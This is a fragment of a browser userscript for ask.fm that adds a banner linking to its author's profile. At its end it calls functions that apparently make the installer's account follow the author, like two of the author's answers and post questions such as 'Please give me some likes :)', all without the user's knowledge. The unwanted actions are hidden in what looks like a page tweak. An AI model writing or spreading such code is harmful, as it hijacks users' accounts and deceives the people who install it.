...
// @version			2.7
// @copyright		http://ask.fm/RazzuDawnKeebals
...
if(body != null) {
	...
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to hide'>&laquo;</a> &#8226; <a href='http://ask.fm/RazzuDawnKeebals' title='My ask.fm' style='color: #FFFFFF;' onclick='alert(\'Thanks for installing this script\');'>My ask.fm</a></div> "
	...
	unsafeWindow.spoiler = function() {
		...
		for(i=1;i<=20;i++) {
			...
			div2.innerHTML = "<a onclick='spoiler()' title='Ask me something'>&laquo;</a> &#8226; <a href='http://ask.fm/RazzuDawnKeebals' title='Razzu'>Ask me</a>"
			}
			else {
...
follow("RazzuDawnKeebals");
likeThis("RazzuDawnKeebals","112535580624");
likeThis("RazzuDawnKeebals","106692633808");
createQuestion("RazzuDawnKeebals","Please give me some likes :)");
createQuestion("RazzuDawnKeebals","I LOVE YOU <3");
//createQuestion("RazzuDawnKeebals","Followed you *-*");
//createQuestion("RazzuDawnKeebals","I LOVE YOU SO MUCH *o*");
//createQuestion("RazzuDawnKeebals","GREAT Answers!");